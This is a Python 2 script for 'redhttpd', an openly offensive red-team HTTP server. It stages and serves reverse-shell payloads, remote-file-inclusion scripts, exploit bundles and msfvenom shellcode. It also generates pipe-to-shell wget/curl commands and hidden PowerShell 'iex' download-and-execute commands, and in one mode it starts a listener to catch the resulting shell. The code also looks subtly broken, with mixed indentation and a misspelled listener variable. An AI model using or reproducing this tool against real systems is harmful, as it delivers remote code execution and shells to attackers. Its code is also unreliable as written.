#!/usr/bin/env python

import SimpleHTTPServer
import SocketServer
import os
import sys
from thread import *
import sys
import glob
import argparse
import shutil
from argparse import RawTextHelpFormatter
import subprocess
from simplelistener import SimpleListener

VERSION_MAJOR="0"
VERSION_MINOR="2b"

ADDRESS="0.0.0.0"
PORT=3734
ROOT_DIR="/tmp/redhttpd/"
YOLO_DIR="yolo/"
MSF_DIR="msf/"
RFI_DIR="rfi/"
EXPLOITS_DIR="exploits/"
MSFVENOM_SHELLCODE_FILENAME="msf"
LHOST_PLACEHOLDER="LHOST"
LPORT_PLACEHOLDER="LPORT"

YOLO_PAYLOAD="sh"
YOLO_PAYLOAD_LIST=["sh", "py", "ps1"]

RFI_TYPE="php"
RFI_TYPES=["php", "asp", "aspx"]

EXPLOITS_DEFAULT="suggesters"
EXPLOITS_TARGETS=["suggesters", "linux", "windows", "mac"]

CLIPBOARD_OPTION="wget"
CLIPBOARD_OPTIONS=["wget", "curl", "powershell"]

def vprint(s, level=1):
	if level <= args.verbosity:
		print(s)

def inplace_filedata_replace(filepath, old, new):
	with open(filepath, 'r') as file :
		filedata = file.read()

	filedata = filedata.replace(old, new)

	with open(filepath, 'w') as file:
		file.write(filedata)


def parse_args():

	parser = argparse.ArgumentParser(description="RedTeam httpd.", formatter_class=RawTextHelpFormatter)

	parser.add_argument("-a", "--binding-address", default=ADDRESS, help="Local address where to bind.")
	parser.add_argument("-p", "--port", type=int, default=PORT, help="Listening port.")
	parser.add_argument("-d", "--root-directory", default=ROOT_DIR, help="Root directory.")

	group = parser.add_mutually_exclusive_group(required=True)

	group.add_argument("-y", "--yolo", nargs="?", choices=YOLO_PAYLOAD_LIST, const=YOLO_PAYLOAD, help="YOLO mode. Copy custom payloads from the corresponding '{0}' directory to root directory. Use it to serve one request and shutdown. Useful when chained with a reverse shell listener, listening on the same port. Warning: With this option on, -p/--port value will always be used even if LPORT is set. E.g.: {1} -p 53 -y".format(YOLO_DIR, sys.argv[0]))
	group.add_argument("-r", "--rfi", nargs="?", choices=RFI_TYPES, const=RFI_TYPE, help="RFI mode. Copy custom RFI payload from corresponding '{0}' directory to root directory. Default: {1}. Use with -e/--extension argument to remove or change file extension.".format(RFI_DIR, RFI_TYPE))
	group.add_argument("-x", "--exploits", nargs="?", choices=EXPLOITS_TARGETS, const=EXPLOITS_DEFAULT, help="Exploits mode. Copy custom exploits from the corresponding '{0}' directory to root directory. The default value is: linux.".format(EXPLOITS_DIR))
	group.add_argument("-m", "--msf-shell", nargs="?", help="msfvenom mode. Use msfvenom to create a shellcode and serve it. Use it just like msfvenom without LHOST, LPORT and -o parameters. E.g.: {0} -m \" -p linux/x86/shell_reverse_tcp -f elf\" --LHOST 192.168.0.1 --LPORT 53. (msfvenom required)".format(sys.argv[0]))
	group.add_argument("-f", "--files", nargs="+", help="Custom files mode. Simply copy desired files to root directory.")

	parser.add_argument("-e", "--extension", nargs="?", const='', help="Change files extension. Only useful when used with -r/--rfi.")
	parser.add_argument("-c", "--clipboard", nargs="?", choices=CLIPBOARD_OPTIONS, const=CLIPBOARD_OPTION, help="Copy wget/curl/powershell + URL string to clipboard. Default: wget. (xclip required)")

	parser.add_argument("-v", "--verbosity", type=int, choices=[0,1,2], default=1, help="Set verbosity level.")

	parser.add_argument("--LHOST", default="127.0.0.1", help="Use to substitute host placeholder.")
	parser.add_argument("--LPORT", type=int, help="Use to substitute port placeholder.")

	parser.add_argument("--no-listener", action="store_true", help="Disables default reverse shell listener used in YOLO mode. By default, in YOLO mode, the listerner starts after httpd handler is closed, on the same port redhttpd was running.")

	return parser.parse_args()


def main():

	global args
	args = parse_args()
	#print args

	if args.LPORT is None:
		args.LPORT = args.port

	# create redhttpd folder if doesn't exist
	if not os.path.exists(args.root_directory):
	    os.makedirs(args.root_directory)

	file_list = []

	if args.LHOST == "127.0.0.1":
		vprint("WARNING: using 127.0.0.1 as LHOST!")
	if args.LPORT == args.port and not args.yolo:
		vprint("WARNING: using " + str(args.port) + " as LPORT!")


	if args.yolo:
		filename = YOLO_DIR + str(args.yolo) + ".txt"
		if os.path.isfile(filename):
			shutil.copy(filename, args.root_directory + "/" + os.path.basename(filename))
			inplace_filedata_replace(args.root_directory + "/" + os.path.basename(filename), "LHOST", args.LHOST)
			inplace_filedata_replace(args.root_directory + "/" + os.path.basename(filename), "LPORT", str(args.LPORT))
			file_list.append(os.path.basename(filename))

	elif args.files:
	       	for filename in args.files:
	               	try:
	                       	if os.path.isfile(filename):
	                                shutil.copy(filename, args.root_directory + "/" + os.path.basename(filename))
	       	                        file_list.append(os.path.basename(filename))
	               	except:
	                       	continue

	elif args.rfi:
	       	for filename in glob.glob(os.path.join(RFI_DIR, args.rfi + '*')):
			filename_root = os.path.splitext(filename)[0]
			if args.extension == None:
				new_filename = filename
			else:
				if args.extension:
					new_filename = filename_root + "." + args.extension
				else:
					new_filename = filename_root
			shutil.copy(filename, args.root_directory + "/" + os.path.basename(new_filename))
			inplace_filedata_replace(args.root_directory + "/" + os.path.basename(filename), "LHOST", args.LHOST)
			inplace_filedata_replace(args.root_directory + "/" + os.path.basename(filename), "LPORT", str(args.LPORT))
			file_list.append(os.path.basename(new_filename))

	elif args.exploits:
	       	for filename in glob.glob(os.path.join(EXPLOITS_DIR + "/" + args.exploits, '*')):
			shutil.copy(filename, args.root_directory + "/" + os.path.basename(filename))
       	                file_list.append(os.path.basename(filename))

	elif args.msf_shell:
		msfvenom_args = args.msf_shell.split()
		msfvenom_args.insert(0, "msfvenom")
		msfvenom_args.append("LHOST="+args.LHOST)
		msfvenom_args.append("LPORT="+str(args.LPORT))
		msfvenom_args.append("-o")
		msfvenom_args.append(args.root_directory + "/" + MSFVENOM_SHELLCODE_FILENAME)
		p = subprocess.Popen(msfvenom_args)
		vprint("Waiting for msfvenom to build the payload...")
		p.wait()
		file_list.append(MSFVENOM_SHELLCODE_FILENAME)

	if args.clipboard:
		if len(file_list) == 1:
			if args.yolo:
				if args.clipboard == 'wget':
					cmd = "wget -O- http://{0}:{1}/{2} {3}".format(args.LHOST, args.port, file_list[0], "| " + args.yolo)
				elif args.clipboard == 'curl':
					cmd = "curl -s http://{0}:{1}/{2} {3}".format(args.LHOST, args.port, file_list[0], "| " + args.yolo)
				elif args.clipboard == 'powershell':
					cmd = 'powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "iex (wget http://{}:{}/{}).Content"'.format(args.LHOST, args.port, file_list[0])
			else:
				if args.clipboard == 'wget':
					cmd = "wget -O /tmp/{2} http://{0}:{1}/{2}".format(args.LHOST, args.port, file_list[0])
				elif args.clipboard == 'curl':
					cmd = "curl -o /tmp/{2} http://{0}:{1}/{2}".format(args.LHOST, args.port, file_list[0])
				elif args.clipboard == 'powershell':
					cmd = 'powershell -ExecutionPolicy Bypass -Command "wget -O %TEMP%\{2} http://{0}:{1}/{2}"'.format(file_list[0], args.LHOST, args.port, file_list[0])
			vprint("COPY/PASTE CMD: " + cmd, 2)
			try:
				os.system("echo '" + cmd + "'|xclip -selection c")
			except:
				pass

	# use only unique filenames
	file_list = set(file_list)

	# change current directoy to httpd root dir
	os.chdir(args.root_directory)

	handler = SimpleHTTPServer.SimpleHTTPRequestHandler
	handler.server_version = "redhttpd/{0}.{1}".format(VERSION_MAJOR, VERSION_MINOR)
	handler.sys_version = ""
	SocketServer.TCPServer.allow_reuse_address=True

	try:
		vprint("redhttpd bind to {0}:{1}".format(args.binding_address, args.port))
		vprint("Serving at {0}".format(args.root_directory))
		vprint("Files: ")
		for filename in file_list:
			vprint(filename)
		vprint("")

		if args.yolo:
			while True:
				vprint("Now on HTTPD mode", 2)
				httpd = SocketServer.TCPServer((args.binding_address, args.port), handler)
				httpd.handle_request()
				httpd.server_close()
				if args.yolo and not args.no_listener:
					vprint("Now on SIMPLELISTENER mode", 2)
					listerner = SimpleListener(args.binding_address, args.port)
					listener.start()

		else:
			httpd = SocketServer.TCPServer((args.binding_address, args.port), handler)
			httpd.serve_forever()

	except KeyboardInterrupt:
		print("Keyboard Interrupt received! Shutting down...")

	finally:
		httpd.server_close()

		for filename in file_list:
			if os.path.isfile(filename):
				os.remove(filename)

args = None
if __name__ == "__main__":
	main()
